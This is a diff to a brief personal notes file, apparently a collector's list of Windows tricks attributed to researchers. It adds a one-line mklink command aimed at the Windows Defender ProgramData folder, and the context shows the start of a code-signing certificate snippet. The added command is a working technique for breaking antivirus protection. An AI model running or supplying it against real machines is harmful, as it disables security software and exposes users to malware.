@@ -1,5 +1,11 @@
 # notes 
 
+### @jonasLyk burning shit down
+
+````
+mklink "C:\ProgramData\Microsoft\Windows Defender:omgwtfbbq" "\??\NUL"
+````
+
 ### @rootsecdev straight up making me type
 ````
 $cert=(dir cert:currentuser\my\ -CodeSigningCert)
